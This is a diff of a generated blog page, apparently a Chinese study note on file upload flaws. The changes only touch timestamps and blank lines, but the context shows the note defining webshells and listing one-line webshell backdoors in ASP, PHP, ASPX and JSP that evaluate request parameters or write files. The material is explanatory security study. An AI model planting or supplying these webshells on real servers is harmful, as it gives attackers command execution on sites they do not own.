@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://example.com/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/zxczxc.png">
 <meta property="og:image" content="http://example.com/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/dfgfgsdfgsdf.png">
 <meta property="article:published_time" content="2023-04-19T07:21:37.059Z">
-<meta property="article:modified_time" content="2023-04-19T07:40:45.011Z">
+<meta property="article:modified_time" content="2023-04-19T07:45:57.123Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/image-20221202152110020.png">
@@ -240,8 +240,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-04-19 15:40:45</span>
-            <span class="mobile">2023-04-19 15:40</span>
+            <span class="desktop">2023-04-19 15:45:57</span>
+            <span class="mobile">2023-04-19 15:45</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -575,8 +575,6 @@
 <h5 id="高危点"><a href="#高危点" class="headerlink" title="高危点"></a>高危点</h5><p>相册、头像上传视频、照片分享附件上传（论坛发帖、邮箱）文件管理器</p>
 <h4 id="2-2、webshell定义"><a href="#2-2、webshell定义" class="headerlink" title="2.2、webshell定义"></a>2.2、webshell定义</h4><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</p>
 <h4 id="2-3、通用各类型的一句话木马"><a href="#2-3、通用各类型的一句话木马" class="headerlink" title="2.3、通用各类型的一句话木马"></a>2.3、通用各类型的一句话木马</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request (&quot;shell&quot;)%&gt;         //asp格式</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[value]);?&gt;     // php格式</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt;        //aspx格式</span><br><span class="line"></span><br><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;       //jsp格式</span><br></pre></td></tr></table></figure></div>
-
-
 
 <h4 id="2-4、绕过方式"><a href="#2-4、绕过方式" class="headerlink" title="2.4、绕过方式"></a>2.4、绕过方式</h4><p><img  
                      lazyload
